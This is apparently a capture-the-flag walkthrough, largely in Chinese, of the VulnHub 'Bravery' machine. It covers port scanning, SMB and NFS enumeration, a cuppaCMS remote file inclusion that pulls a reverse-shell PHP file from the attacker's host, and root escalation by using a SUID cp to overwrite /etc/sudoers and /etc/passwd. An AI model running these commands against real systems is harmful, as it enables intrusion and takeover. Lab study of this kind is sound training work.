## port scan

```shell
# Nmap 7.94SVN scan initiated Tue Jan 28 00:19:11 2025 as: nmap -sT --min-rate=8899 -p- -oN nmap_result/port 192.168.28.18
Nmap scan report for 192.168.28.18 (192.168.28.18)
Host is up (0.00094s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3306/tcp  open  mysql
8080/tcp  open  http-proxy
20048/tcp open  mountd
33298/tcp open  unknown
57158/tcp open  unknown
```

```shell
┌──(kali㉿kali)-[~/vulnhub/bravery-improved]
└─$ cat nmap_result/port | grep 'open' | awk -F'/' '{print $1}'| tr "\n" ','
22,53,80,111,139,443,445,2049,3306,8080,20048,33298,57158,
```

```shell
# Nmap 7.94SVN scan initiated Tue Jan 28 00:20:09 2025 as: nmap -p22,53,80,111,139,443,445,2049,3306,8080,20048,33298,57158 -sVC -O -oN nmap_result/detils 192.168.28.18
Nmap scan report for 192.168.28.18 (192.168.28.18)
Host is up (0.00099s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4d:8f:bc:01:49:75:83:00:65:a9:53:a9:75:c6:57:33 (RSA)
|   256 92:f7:04:e2:09:aa:d0:d7:e6:fd:21:67:1f:bd:64:ce (ECDSA)
|_  256 fb:08:cd:e8:45:8c:1a:c1:06:1b:24:73:33:a5:e4:77 (ED25519)
53/tcp    open  domain      dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp   open  ssl/http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2018-06-10T15:53:25
|_Not valid after:  2019-06-10T15:53:25
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_ssl-date: TLS randomness does not represent time
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  netbios-ssn Samba smbd 4.7.1 (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     3 (RPC #100227)
3306/tcp  open  mysql       MariaDB (unauthorized)
8080/tcp  open  http        nginx 1.12.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.12.2
| http-robots.txt: 4 disallowed entries 
|_/cgi-bin/ /qwertyuiop.html /private /public
|_http-title: Welcome to Bravery! This is SPARTA!
20048/tcp open  mountd      1-3 (RPC #100005)
33298/tcp open  nlockmgr    1-4 (RPC #100021)
57158/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:78:A8:55 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: BRAVERY

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.1)
|   Computer name: localhost
|   NetBIOS computer name: BRAVERY\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2025-01-28T00:20:24-05:00
| smb2-time: 
|   date: 2025-01-28T05:20:24
|_  start_date: N/A
|_nbstat: NetBIOS name: BRAVERY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

139，445端口（SMB服务），mysql服务，2049端口（nfs服务）

## enum

smb服务枚举

```
smbmap -H 192.168.28.18
```

```shell
┌──(kali㉿kali)-[~/vulnhub/bravery-improved]
└─$ smbclient -L //192.168.28.18
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        anonymous       Disk      
        secured         Disk      
        IPC$            IPC       IPC Service (Samba Server 4.7.1)
Reconnecting with SMB1 for workgroup listing.
```

```shell
┌──(kali㉿kali)-[~/vulnhub/bravery-improved]
└─$ smbclient -N //192.168.28.18/anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 28 09:01:35 2018
  ..                                  D        0  Thu Jun 14 12:30:39 2018
  patrick's folder                    D        0  Fri Sep 28 08:38:27 2018
  qiu's folder                        D        0  Fri Sep 28 09:27:20 2018
  genevieve's folder                  D        0  Fri Sep 28 09:08:31 2018
  david's folder                      D        0  Tue Dec 25 21:19:51 2018
  kenny's folder                      D        0  Fri Sep 28 08:52:49 2018
  qinyi's folder                      D        0  Fri Sep 28 08:45:22 2018
  sara's folder                       D        0  Fri Sep 28 09:34:23 2018
  readme.txt                          N      489  Fri Sep 28 09:54:03 2018

                17811456 blocks of size 1024. 12981196 blocks available
```

```shell
┌──(kali㉿kali)-[~/vulnhub/bravery-improved]
└─$ smbclient -N //192.168.28.18/secured
tree connect failed: NT_STATUS_ACCESS_DENIED
```

nfs服务枚举

```shell
┌──(kali㉿kali)-[~/vulnhub/bravery-improved]
└─$ showmount -e 192.168.28.18          
Export list for 192.168.28.18:
/var/nfsshare *
```

挂载`/var/nfsshare`

```
sudo mount 192.168.1.199:/var/nfsshare tmp/nfsshare
```

```shell
┌──(kali㉿kali)-[/tmp/nfsshare]
└─# tree .
.
├── discovery
├── enumeration
├── explore
├── itinerary
│   └── david
├── password.txt
├── qwertyuioplkjhgfdsazxcvbnm
└── README.txt
```

拿到可能的用户名密码

`david:qwertyuioplkjhgfdsazxcvbnm`

用用户名密码进行smb枚举

```shell
┌──(kali㉿kali)-[~/vulnhub/bravery-improved]
└─$ enum4linux -S 192.168.28.18 
......
        Sharename       Type      Comment
        ---------       ----      -------
        anonymous       Disk      
        secured         Disk      
        IPC$            IPC       IPC Service (Samba Server 4.7.1)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BRAVERY

[+] Attempting to map shares on 192.168.28.18

//192.168.28.18/anonymous       Mapping: OK Listing: OK Writing: N/A
//192.168.28.18/secured Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//192.168.28.18/IPC$    Mapping: N/A Listing: N/A Writing: N/A
enum4linux complete on Tue Jan 28 07:04:12 2025
```

尝试使用用户名密码，挂载`//192.168.28.18/secured`

```shell
sudo mount //192.168.28.18/secured /tmp/secured -o username=david -o password=qwertyuioplkjhgfdsazxcvbnm
```

```shell
┌──(kali㉿kali)-[/tmp/secured]
└─$ ls
david.txt  genevieve.txt  README.txt

┌──(kali㉿kali)-[/tmp/secured]
└─$ cat *                                    
I have concerns over how the developers are designing their webpage. The use of "developmentsecretpage" is too long and unwieldy. We should cut short the addresses in our local domain.

1. Reminder to tell Patrick to replace "developmentsecretpage" with "devops".

2. Request the intern to adjust her Favourites to http://<developmentIPandport>/devops/directortestpagev1.php.
Hi! This is Genevieve!

We are still trying to construct our department's IT infrastructure; it's been proving painful so far.

If you wouldn't mind, please do not subject my site (http://192.168.254.155/genevieve) to any load-test as of yet. We're trying to establish quite a few things:

a) File-share to our director.
b) Setting up our CMS.
c) Requesting for a HIDS solution to secure our host.
README FOR THE USE OF THE BRAVERY MACHINE:

Your use of the BRAVERY machine is subject to the following conditions:

1. You are a permanent staff in Good Tech Inc.
2. Your rank is HEAD and above.
3. You have obtained your BRAVERY badges.

For more enquiries, please log into the CMS using the correct magic word: goodtech.
```

http://192.168.254.155/genevieve

存在`genevieve`路径

找到`cuppaCMS`

![](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250128200923823.png)

## web

目录扫描

```shell
# Dirsearch started Tue Jan 28 00:42:01 2025 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://192.168.28.18/

200     2B   http://192.168.28.18/0
200     2B   http://192.168.28.18/1
200     2B   http://192.168.28.18/2
200     2B   http://192.168.28.18/3
200     2B   http://192.168.28.18/4
200     2B   http://192.168.28.18/5
200     2B   http://192.168.28.18/6
200     2B   http://192.168.28.18/7
200    30B   http://192.168.28.18/8
200     2B   http://192.168.28.18/9
200    79B   http://192.168.28.18/about
200    27B   http://192.168.28.18/contactus
200     1B   http://192.168.28.18/phpinfo.php
200    12B   http://192.168.28.18/README.txt
301   237B   http://192.168.28.18/uploads    -> REDIRECTS TO: http://192.168.28.18/uploads/
200   886B   http://192.168.28.18/uploads/
```

```shell
┌──(kali㉿kali)-[~/vulnhub/bravery-improved]
└─$ curl http://192.168.28.18/uploads/files/internal/department/procurement/sara/note.txt

Remind gen to set up my cuppaCMS account.
```

提示应该是有个cuppaCMS的

```
http://192.168.28.18/genevieve/cuppaCMS/index.php
```

该CMS是存在一个文件包含（RFI）,可以远程包含

```shell
#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------
```

python起一个http服务，包含反弹shell即可

```
http://192.168.28.18/genevieve/cuppaCMS/alerts/alertConfigField.php?urlConfig=http://192.168.28.4/shell.php
```

`Configuration.php`如下：

```php
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "bravery";
		public $user = "root";
		public $password = "r00tisawes0me";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "goodtech";
		public $secure_login_redirect = "doorshell.jpg";
	} 
?>
```

## 提权

```
find / -perm -u=s -type f 2>/dev/null
```

/usr/bin/cp是suid权限的

可以写任意文件了（/etc/sudoers，/etc/passwd）等

```shell
echo "apache ALL=(ALL) NOPASSWD:ALL" | /usr/bin/cp /dev/stdin "/etc/sudoers"
```

```shell
echo "co:$1$co$5eSY9siNSJ4oyan/wF6j50:0:0::/root:/bin/bash" | /usr/bin/cp /dev/stdin "/etc/passwd"
```

记得备份passwd文件

**猜测的思路**

www目录下有一个maintenance.sh 文件，似乎是计划任务，也是可以尝试的

```shell
[root@bravery ~]# cd /var/www/
[root@bravery www]# ls
cgi-bin  html  maintenance.sh
[root@bravery www]# cat maintenance.sh 
#!/bin/sh

rm /var/www/html/README.txt
echo "Try harder!" > /var/www/html/README.txt
chown apache:apache /var/www/html/README.txt
```

```shell
[root@bravery www]# ls -l /var/www/maintenance.sh
-rw-r--r--. 1 root root 130 Jun 23  2018 /var/www/maintenance.sh
```

正好利用cp命令

```shell
[root@bravery ~]# cat /var/spool/cron/root 
*/5 * * * * /bin/sh /var/www/maintenance.sh
```

5分钟以执行该脚本，证明了该思路

```shell
[root@bravery ~]# cat proof.txt 
Congratulations on rooting BRAVERY. :)
[root@bravery ~]# cat author-secret.txt 
For those of you who have rooted the MERCY box, welcome back.

Some of you who rooted the MERCY box had an interest on who the author is, and what he might be doing. :-)

If you would like to contact the author, please feel free to find the author at his website: https://donavan.sg
```

